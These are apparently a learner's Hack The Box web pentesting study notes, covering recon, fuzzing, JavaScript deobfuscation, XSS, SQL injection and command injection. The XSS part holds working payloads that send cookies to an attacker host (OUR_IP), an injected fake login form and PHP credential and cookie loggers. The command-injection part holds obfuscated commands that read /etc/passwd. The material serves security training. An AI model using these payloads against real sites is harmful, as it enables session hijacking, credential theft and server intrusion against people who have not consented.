# Chandler Rose 
# Web App Pentesting
# HTB Bug Bounty Notes
# March 2023

# Information Gathering (Passive)
## Infrastructure
- Netcraft - Offers information about servers
-- Visit https://sitereport.netcraft.com and entering the target domain.
- WayBack Machine
-- FInd old versions that may have useful comments or exposures
## Subdomains
- VirusTotal
-- VirusTotal maintains its DNS replication service, which is developed by preserving DNS resolutions made when users visit URLs given by them.
-- To receive information about a domain, type the domain name into the search bar and click on the "Relations" tab.
- Certificates
-- Another interesting source of information we can use to extract subdomains is SSL/TLS certificates. The main reason is Certificate Transparency (CT), a project that requires every SSL/TLS certificate issued by a Certificate Authority (CA) to be published in a publicly accessible log.
-- Examine CT logs/Find subdomains with https://censys.io & https://crt.sh. Introduce the domain name of our target organization to start discovering new subdomains. # Great for finding subdomains
Command: export TARGET="facebook.com"
Command: curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "${TARGET}_crt.sh.txt"
Command: head -n20 facebook.com_crt.sh.txt
- The Harvester
-- TheHarvester is a simple-to-use yet powerful and effective tool for early-stage penetration testing and red team engagements. We can use it to gather information to help identify a company's attack surface. The tool collects emails, names, subdomains, IP addresses, and URLs from various public data sources for passive information gathering.
# Information Gathering (Active)
## Infrastructure
- HTTP headers
curl -I "http://${TARGET}"
- WhatWeb
-- Quick 
whatweb -a3 https://www.facebook.com -v
- Wappalyzer
-- Like whatweb in the browser. 
- WafW00f
-- web application firewall (WAF) fingerprinting tool that sends requests and analyses responses to determine if a security solution is in place.
Install: sudo apt install wafw00f -y
Command: wafw00f -v https://www.tesla.com
- AquaTone
-- a tool for automatic and visual inspection of websites across many hosts and is convenient for quickly gaining an overview of HTTP-based attack surfaces by scanning a list of configurable ports, visiting the website with a headless Chrome browser, and taking and screenshot.
Install: sudo apt install golang chromium-driver
Install: go get github.com/michenriksen/aquatone
Install: export PATH="$PATH":"$HOME/go/bin"
Command: cat facebook_aquatone.txt | aquatone -out ./aquatone -screenshot-timeout 1000
## Subdomain
- Zone Transfer 
Command: nslookup -type=NS zonetransfer.me # Testing for name servers
Command: nslookup -type=any -query=AXFR zonetransfer.me nsztm1.digi.ninja # Testing for ANY and AXFR Zone Transfer
Command: nslookup -type=any -query=AXFR inlanefreight.htb 10.129.42.195 # FInd the FQDN.
Command: dig @10.129.178.67 NS axfr inlanefreight.htb # Get all Zone transfers
- Gobuster
-- Gobuster is a tool that we can use to perform subdomain enumeration.
-- Remember that during our passive subdomain enumeration activities, we found a pattern lert-api-shv-{NUMBER}-sin6.facebook.com. We can use this pattern to discover additional subdomains. The first step will be to create a patterns.txt file with the patterns previously discovered, for example:
Command: echo "lert-api-shv-{GOBUSTER}-sin6", "atlas-pp-shv-{GOBUSTER}-sin6" > patterns.txt
Command: export TARGET="facebook.com"
Command: export NS="d.ns.facebook.com"
Command: export WORDLIST="numbers.txt"
Command: gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"
## Virtual Hosts
* A virtual host (vHost) is a feature that allows several websites to be hosted on a single server.
- Identify Virtual Host
Command: curl -s http://192.168.10.10 # Web server identified at that IP.
Command: curl -s http://192.168.10.10 -H "Host: randomtarget.com" # curl request sending domain previously identified in the HOST header.
Command: cp /opt/useful/SecLists/Discovery/DNS/namelist.txt ./vhosts
- VHost Fuzzing
Command: cat ./vhosts | while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://192.168.10.10 -H "HOST: ${vhost}.randomtarget.com" | grep "Content-Length: ";done
- Access Found VHost
Command: curl -s http://192.168.10.10 -H "Host: dev-admin.randomtarget.com"
- FFUF - Fuzz Faster U Fool
Command: curl -s http://192.168.10.10 -H "Host: dev-admin.randomtarget.com" # Fuzzing for VHost with size filter
## Website Crawling
Command: ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt # This task can be very resource-intensive for the target server. If the website responds slower than usual, we can lower the rate of requests using the -rate parameter.
- *Finding Sensitive Information*
-- First create a list of found directory names from the wesbite. Save as folders.txt
-- Next create a file of all the common extensions. Save to extensions.txt 
Command: cewl -m5 --lowercase -w wordlist.txt http://192.168.10.10 # Grabbing keywords that are 5 chars or more, converting to lowercase and saving to .txt file.
Command: ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://192.168.10.10/FOLDERS/WORDLISTEXTENSIONS #  We separate the wordlists by coma and add an alias to them to inject them as fuzzing points later
# Attacking Web Applications with FUFF
- Directory Fuzzing
Command: ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ # Assign alias to wordlist and use it in the url.
## Extension Fuzzing
- One common way to identify that is by finding the server type through the HTTP response headers and guessing the extension. For example, if the server is apache, then it may be .php, or if it was IIS, then it could be .asp or .aspx, and so one. 
Command: ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
## Page Fuzzing
Command: ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
## Recursive Fuzzing
- This is why it is always advised to specify a depth to our recursive scan, such that it will not scan directories that are deeper than that depth. 
Command: ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v 
## Sub-domain Fuzzing 
Command: ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/
## VHOST Fuzzing
Note: The key difference between VHosts and sub-domains is that a VHost is basically a 'sub-domain' served on the same server and has the same IP, such that a single IP could be serving two or more different websites.
Note: VHosts may or may not have public DNS records.
Command: ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' # To scan for VHosts, without manually adding the entire wordlist to our /etc/hosts, we will be fuzzing HTTP headers, specifically the Host: header. To do that, we can use the -H flag to specify a header and will use the FUZZ keyword within it, as follows:
## Filtering Results
Command: FUFF --help | grep filter 
## Parameter Fuzzing - GET
Note: Fuzzing parameters may expose unpublished parameters that are publicly accessible. Such parameters tend to be less tested and less secured, so it is important to test such parameters for the web vulnerabilities we discuss in other modules.
Example: http://admin.academy.htb:PORT/admin/admin.php?param1=key. # Param = param1
Command: ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb/admin/admin.php?FUZZ=key -fs xxx
## Parameter Fuzzing - POST
Note: The main difference between POST requests and GET requests is that POST requests are not passed with the URL and cannot simply be appended after a ? symbol. POST requests are passed in the data field within the HTTP request.
Tip: In PHP, "POST" data "content-type" can only accept "application/x-www-form-urlencoded". So, we can set that in "ffuf" with "-H 'Content-Type: application/x-www-form-urlencoded'".
Command: ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
Note: Try sending a POST request with the id parameter. We can do that with curl.
Command: curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
Note: We get a response that says "Invalid ID", which brings us to fuzzing for values.
## Value Fuzzing
Note: This section will discuss fuzzing for parameter values, which should be fairly similar to fuzzing for parameters, once we develop our wordlist.
- Custom Wordlists
Note: When it comes to fuzzing parameter values, we may not always find a pre-made wordlist that would work for us, as each parameter would expect a certain type of value. 
Command: for i in $(seq 1 1000); do echo $i >> ids.txt; done # Bash command to create a list from 1-1000
- Fuzzing Values
Command: ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
# Javascript Deobfuscation
Note: Obfuscation is a technique used to make a script more difficult to read by humans but allows it to function the same from a technical point of view, though performance may be slower. 
Dev-Note: Doing authentication or encryption on the client-side is not recommended, as code is more prone to attacks this way.
Pro-TIP: Many online tools for obfuscation, though many malicious actors and professional developers develop their own obfuscation tools to make it more difficult to deobfuscate.
## Minifying JavaScript code
Note: Code minification means having the entire code in a single (often very long) line. Code minification is more useful for longer code, as if our code only consisted of a single line, it would not look much different when minified.
Note: Usually, minified JavaScript code is saved with the extension .min.js. Code minification is not exclusive to JavaScript, and can be applied to many other languages, as can be seen on javascript-minifier.
## Packing Javascript Code
Obfuscate Site: https://beautifytools.com/javascript-obfuscator.php
Note: Usually recognizable from the six function arguments used in the initial function "function(p,a,c,k,e,d)".
Test Site: https://jsconsole.com
## Advanced Obfuscation
AdvObfuscater: https://obfuscator.io
## Deobfuscation 
Method 1: Beautify The Code
- open Dev Tools/Debugger, click script.js, click Pretty Print{}.
Beautify Sites: https://prettier.io/playground/   &   https://beautifier.io/
Method 2: Deobfuscate The Code
Site: http://www.jsnice.org/
Note: We should click on the options button next to the "Nicify JavaScript" button, and de-select "Infer types" to reduce cluttering the code with comments.
Note: Ensure you do not leave any empty lines before the script, as it may affect the deobfuscation process and give inaccurate results.
Note: Another way of unpacking such code is to find the return value at the end and use console.log to print it instead of executing it.
## Reverse Engineering
Note: These methods are great, but once the code becomes even more obfuscated or a custom obfuscater is used, it can become more difficult to deobfuscate the code. 
Note: At this point, we would need to manually reverse engineer the code. 
Great Tool: https://lelinhtinh.github.io/de4js/ # Used during skill assessments.
## Code Analysis
- Code Variables - What is being stored? 
- Code Objects - Check them out. Research them if necessary.
- Code Functions - Check them out. What is the function performing? GET or POST request? To where?
Command: curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"
Tip: We add the "-s" flag to reduce cluttering the response with unnecessary data.
## Decoding 
Note: Very often you will find obfuscated code containing encoded text blocks that get decoded upon execution. 
Commonly used Text Encoding Methods:
* base64
Command: echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d # Decoding base64
Note: Spotting Base64 is easy. The length of base64 encoded strings has to be in a multiple of 4. If the resulting output is only 3 characters long, for example, an extra = is added as padding, and so on.
* hex
Note: Spotting hex is also easy. Any string encoded in hex would be comprised of hex characters only, which are 16 characters only: 0-9 and a-f.
Command: echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r # Decoding Hex
* rot13
Note: Spotting rot13 can be easy as well. Even though this encoding method makes any text looks random, it is still possible to spot it because each character is mapped to a specific character. For example, in rot13, http://www becomes uggc://jjj, which still holds some resemblances and may be recognized as such.
Command: echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m' # Decode rot13
Decode Site: https://rot13.com/
NOTE: There are hundreds of other encoding methods we can find online. Even though these are the most common, sometimes we will come across other encoding methods, which may require some experience to identify and decode.
Identify Encoding Type Website: https://www.boxentriq.com/code-breaking/cipher-identifier
# Cross-Site Scripting (XSS)
Note: XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code >
Note: XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the bac>
Risk: Medium Risk (low impact + high probability = medium risk)
Types of XSS:
* Stored(Persistent) XSS - Most critical.
* Reflected(Non-Persistent) XSS - User input displayed to the page.
* DOM-Based XSS - Non-persistent. User input is shown in the browser, completely processed on client-side.
## XSS Testing Payloads
Payload: <script>alert(window.origin)</script> # Alert pop up with the URL of the current page.
Note: You can verify by checking the page source and seeing if your payload is there.
Pro Tip: Tip: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.
Note: Some modern browsers may block the alert() JavaScript function in specific locations
Note: One such XSS payload is <plaintext>, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is <script>print()</script> that will pop up the browser print dialog, which is unlikely to be blocked by any browsers. Try using these payloads to see how each works. You may use the reset button to remove any current payloads.
Note: Once found, refresh the page to see whether the alert stays or goes. Stored or Reflected?
Payload: <script>alert(document.cookie)</script> # Simple payload to show session cookie
Question: But if the XSS vulnerability is Non-Persistent, how would we target victims with it?
Answer: Figure out what type of HTTP request is being used. 
Commands: Open Dev Tools, Netowork tab, test payload again, GET request?, Copy URL, send URL to target.
Note: DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM). No interaction with the backend.
- Source and Sink
Note: To better understand DOM-based XSS vulnerabilities, it is important to understand S & S.
Note: Source = The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.
Note: Sink = The Sink is the function that writes the user input to a DOM Object on the page. 
- Common JS Functions to Write to DOM Objects:
* document.write()
* DOM.innerHTML
* DOM.outerHTML
- Common jQuery Library functions that write to DOM objects:
* add()
* after()
* append()
- DOM-Based Testing
Note: If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the innerHTML function does not allow the use of the <script> tags within it as a security feature.
Payload: <img src="" onerror=alert(window.origin)>
Note: To target a user with this DOM XSS vulnerability, we can once again copy the URL from the browser and share it with them, and once they visit it, the JavaScript code should execute.
## Discovering XSS
- Automated Discovery 
Note: Paid Tools provide the most accuracy and help bypass certain security measures, but there are plenty of open source tools.
Paid Tools: Nessus, Burp Pro, and ZAP.	
Free Tools: XSS Strike, Brute XSS, XSSer.
Command: git clone https://github.com/s0md3v/XSStrike.git # Download XSS Strike
Command: cd XSStrike
Command: pip install -r requirements.txt
Command: python xsstrike.py
Command: python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" # Running the tool against target.
- Manual Discovery
Payloads Link: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
Payloads Link: https://github.com/payloadbox/xss-payload-list
!Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
Note: More efficient to write a python script that automates sending these payloads for us and checking page source.
- Code Review
!Note: We are unlikely to find any XSS vulnerabilities through payload lists or XSS tools for the more common web applications. This is because the developers of such web applications likely run their application through vulnerability assessment tools and then patch any identified vulnerabilities before release.
Note: Reviewing the code from frontend to backend is the best way to detect XSS vulnerabilties.
## XSS Attacks
- Website Defacing
Note: Defacing a website means changing its look for anyone who visits the website.
How: Three HTML elements are usually utilized to change the main look of a web page:
	Background Color document.body.style.background
    	Background document.body.background
    	Page Title document.title
    	Page Text DOM.innerHTML
-- Changing the Background
Payload: <script>document.body.style.background = "#141d2b"</script> # Change website background to dark color.
Payload: <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script> # Set an image as the background. 
Payload: <script>document.title = 'HackTheBox Academy'</script> # Change the website title. 
Payload: document.getElementById("todo").innerHTML = "New Text" # Changing the pages text.
Payload: $("#todo").html('New Text'); #  Utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line.
Note: To do so, the jQuery library must have been imported within the page source
Payload: document.getElementsByTagName('body')[0].innerHTML = "Hacked" # Change the entire HTML code to only reveal "Hacked".
Note: As we can see, we can specify the body element with document.getElementsByTagName('body'), and by specifying [0], we are selecting the first body element, which should change the entire text of the web page.
Note: We may also use jQuery to achieve the same thing. 
How?: Locally prepare html code to be used in our payload. Next minify the code to one line. 
Final Payload: <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
## Phishing
- Login Form Injection
Note: To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.
CODE: 
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
Note: To write HTML code to the vulnerable page, we use the JavaScript function document.write().
Note: Minify the html code and add it to the write function.
XSS Phishing Payload: document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
Note: We can see that the URL field is still displayed, which defeats our line of "Please login to continue".
Note: To remove the field, find the ID in inspector/source and use the document.getElementById().remove() function to remove it.
Code: document.getElementById('urlform').remove();
New Payload: document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
- Credential Stealing
Note: Send URL to the victim and start a nc listener on attack machine. 
Note: This is great, but obvious to the victim that something is wrong. 
Note: We can make the attack better by adding a php script.
PHP Script:
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
Note: our index.php file ready, we can start a PHP listening server, which we can use instead of the basic netcat listener we used earlier.
Command: mkdir /tmp/tmpserver
Command: cd /tmp/tmpserver
Command: nano index.php #at this step we wrote our index.php file
Command: sudo php -S 0.0.0.0:80
## Session Hijacking
Note: With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka Cookie Stealing) attack.
- Blind XSS
Note: A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.
Common Forms Vulnerable to Blind XSS:
    Contact Forms
    Reviews
    User Details
    Support Tickets
    HTTP User-Agent header
Question: How can we test for blind XSS if we can see the output of our script?
Answer: We can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.
- Loading a Remote Script
Payload: <script src="http://OUR_IP/script.js"></script> # Including a remote script
Note: We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script
Payload: <script src="http://OUR_IP/username"></script>
Note: If we get a request for /username, then we know that the username field is vulnerable to XSS, and so on.
RemoteScript Test Payloads:
Payload: <script src=http://OUR_IP></script>
Payload: '><script src=http://OUR_IP></script>
Payload: "><script src=http://OUR_IP></script>
Payload: javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
Payload: <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
Payload: <script>$.getScript("http://OUR_IP")</script>
Note: A session hijacking attack is very similar to the phishing attack we performed in the previous section. It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.
Cookie Test Payloads:
Payload: document.location='http://OUR_IP/index.php?c='+document.cookie;
Payload: new Image().src='http://OUR_IP/index.php?c='+document.cookie;
Note: if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.
PHP Script:
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
Note: Should store the cookie(s) neatly in a text file. 
Note: Once we have login cookie, we can use it to hijack the users session. Paste in Storage Value. Reload page.
# SQL Injection Fundamentals
Note: When user-supplied information is used to construct the query to the database, malicious users can trick the query into being used for something other than what the original programmer intended, providing the user access to query the database using an attack known as SQL injection (SQLi).
Note: There are relational and non-relational databases.
Note: Relational = A relational database is the most common type of database. It uses a schema, a template, to dictate the data structure stored in the database.
Note: A non-relational database (also called a NoSQL database) does not use tables, rows, and columns or prime keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.
Note: Non-relational Databases have a different method for injection, known as NoSQL injections. SQL injections are completely different than NoSQL injections. NoSQL injections will be covered in a later module.
-MySQL
Command: mysql -u root -p # Interacting with mysql database. If password is used in command then no space between -p<pass>.
Command: mysql -u root -h docker.hackthebox.eu -P 3306 -p # Specify a remote host and port.
-MySQL Commands
Command: CREATE DATABASE users; # Create a database.
Command: SHOW DATABASES; # Show databases.
Command: USE users; # change to specified database.
mysql> CREATE TABLE logins (     # create a table w/ columns.
    ->     id INT,
    ->     username VARCHAR(100),
    ->     password VARCHAR(100),
    ->     date_of_joining DATETIME
    ->     );
Command: DESCRIBE logins; # List the table structure within its fields and data types.
Note: Within the CREATE TABLE query, there are many properties that can be set for the table and each column. For example, we can set the id column to auto-increment using the AUTO_INCREMENT keyword, which automatically increments the id by one every time a new item is added to the table:
!Note: one of the most important properties is PRIMARY KEY, which we can use to uniquely identify each record in the table, referring to all data of a record within a table for relational databases, as previously discussed in the previous section. We can make the id column the PRIMARY KEY for this table:
Command: PRIMARY KEY (id)
Cmd: CREATE TABLE logins (       # Putting it all together.
     id INT NOT NULL AUTO_INCREMENT,
     username VARCHAR(100) UNIQUE NOT NULL,
     password VARCHAR(100) NOT NULL,
     date_of_joining DATETIME DEFAULT NOW(),
     PRIMARY KEY (id)
     );
## MySQL Statements
* INSERT = used to add new records to a given table.
EX: INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
EX: INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!'); # Insert multiple entries at once.
* SELECT = retrieve data. Can also be used for many other purposes.
EX: SELECT * FROM table_name;
* DROP = Remove tables and databases from the server.
EX: DROP TABLE logins;
ALTER = Change the name of any table and any of its fields or to delete or add a new column to an existing table.
EX: ALTER TABLE logins ADD newColumn INT;
EX: ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn; # Use rename column to rename column. Modify and drop also exist.
* UPDATE = Used to update specific records within a table, based on certain conditions. 
EX: UPDATE logins SET password = 'change_password' WHERE id > 1; # This query updated all passwords in all records where the id was more significant than 1.
- Controlling Results Output
* ORDER BY = We can sort the results of any query
EX: SELECT * FROM logins ORDER BY password;
Note: By default, the sort is done in ascending order, but we can also sort the results by ASC or DESC
EX: SELECT * FROM logins ORDER BY password DESC;
Note: It is also possible to sort by multiple columns, to have a secondary sort for duplicate values in one column.
EX: SELECT * FROM logins ORDER BY password DESC, id ASC;
* LIMIT = In case our query returns a large number of records, we can LIMIT the results to what we want. 
EX: SELECT * FROM logins LIMIT 2;
* WHERE = To filter or search for specific data, we can use conditions with the SELECT statement using the WHERE clause.
EX: SELECT * FROM logins WHERE id > 1;
Note: String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly.
* LIKE = Enabling selecting records by matching a certain pattern. 
EX: SELECT * FROM logins WHERE username LIKE 'admin%'; # The % symbol acts as a wildcard and matches all characters after admin. It is used to match zero or more characters. Similarly, the _ symbol is used to match exactly one character. 
## SQL Operators
Note: Sometimes, expressions with a single condition are not enough to satisfy the user's requirement. For that, SQL supports Logical Operators to use multiple conditions at once. The most common logical operators are AND, OR, and NOT.
- AND = The AND operator takes in two conditions and returns true or false based on their evaluation:
- OR = The OR operator takes in two expressions as well, and returns true when at least one of them evaluates to true:
- NOT = The NOT operator simply toggles a boolean value 'i.e. true is converted to false and vice versa':
## Intro to SQL Injection
- Types of SQL Injection
-- In-band - In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
	*Union based - We may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there.
	*Eroor based - It is used when we can get the PHP or SQL errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.
-- Blind - In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. 
	*Boolean based - We can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns true. 
	*Time based - We use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.
-- Out of band - Finally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. 
## SQLi Discovery
- Testing for SQL injection
Payload URL Encoded
'	%27
"	%22
# 	%23
;	%3B
)	%29
- OR Injection
-- We would need the query to always return true.
EX: admin' or '1'='1
EX: SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
NOTE: Using a prefix with sqlmap to inject 
# Bypassing Web Application Protestions
- Anti CSRF Token Bypass
CMD: --csrf-token
- Unique Value Bypass
CMD: --randomize : pointing to the parameter name containing a value which should be randomized before being sent:
CMD: sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
- Calculated Parameter Bypass: where a valid Python code is being evaluated just before the request is being sent to the target: 
CMD: --eval 
CMD: sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
- IP Address Concealing : Setup a proxy with the option --proxy 
CMD: --proxy="socks4://177.39.187.70:33283"
NOTE: A list of proxies can be provide with the follwoing:  --proxy-file | --tor will auto connect | --check-tor to check config 
- WAF Bypass 
NOTE: SQLMAP authomatically test for WAF. Use --skip-waf to skip check.
CMD: --skip-waf 
- Ugent Agent Blacklisting Bypass
NOTE: In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. User-agent: sqlmap/1.4.9 (http://sqlmap.org)).
CMD: --random-agent | easy bypass 
- Tamper Scripts 
NOTE: amper scripts can be chained, one after another, within the --tamper option (e.g. --tamper=between,randomcase), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte).
- Miscellaneous Bypasses
NOTE & CMD: The first one is the Chunked transfer encoding, turned on using the switch --chunked, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.
NOTE & CMD: The other bypass mechanisms is the HTTP parameter pollution (HPP), where payloads are split in a similar way as in case of --chunked between different same parameter named values (e.g. ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).
# Command Injection 
- Types of Injections
* OS Command Injection
* Code Injection 
* SQL Injection 
* XXS HTML Injection 
* LDAP Injection 
* NoSQL Injection 
* HTTP Header Injection 
* Xpath Injection 
* IMAP Injection 
* ORM Injection 
NOTE:  Whenever user input is used within a query without being properly sanitized, it may be possible to escape the boundaries of the user input string to the parent query and manipulate it to change its intended purpose. This is why as more web technologies are introduced to web applications, we will see new types of injections introduced to web applications.
# Injection Methods 
Injection Operator 	Injection Character 	URL-Encoded Character 	Executed Command
Semicolon 	; 	%3b 	Both
New Line 	\n 	%0a 	Both
Background 	& 	%26 	Both (second output generally shown first)
Pipe 	| 	%7c 	Both (only second output is shown)
AND 	&& 	%26%26 	Both (only if first succeeds)
OR 	|| 	%7c%7c 	Second (only if first fails)
Sub-Shell 	`` 	%60%60 	Both (Linux-only)
Sub-Shell 	$() 	%24%28%29 	Both (Linux-only)

Injection Type 	Operators
SQL Injection 	' , ; -- /* */
Command Injection 	; &&
LDAP Injection 	* ( ) & |
XPath Injection 	' or and not substring concat count
OS Command Injection 	; & |
Code Injection 	' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal/File Path Traversal 	../ ..\\ %00
Object Injection 	; & |
XQuery Injection 	' ; -- /* */
Shellcode Injection 	\x \u %u %n
Header Injection 	\n \r\n \t %0d %0a %09
## Bypassing Filters and WAFs 
* Blacklisted Characters 
- Identifying blacklisted characters
## Bypassing Space Filters
ip=127.0.0.1%0a{ls,-lah,${PATH:0:1}home} # using envioment variables as / for home directory
## Advanced Command Obfuscation 
* Case Manipulation 
EX: WhOamI
* Reversed Commands
EX: echo 'whoami' | rev
* Encoded Commands 
EX: echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
## Automated Tools for Advanced Security Tools 
Linux(Bashfuscator)
EX: ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
Test Output: bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
root:x:0:0:root:/root:/bin/bash
Windows (DOSfuscation)
## Prevent Command Injection
* Avoid Using System Commands
* Input Validation 
* Input Sanitization
* Server Configuration
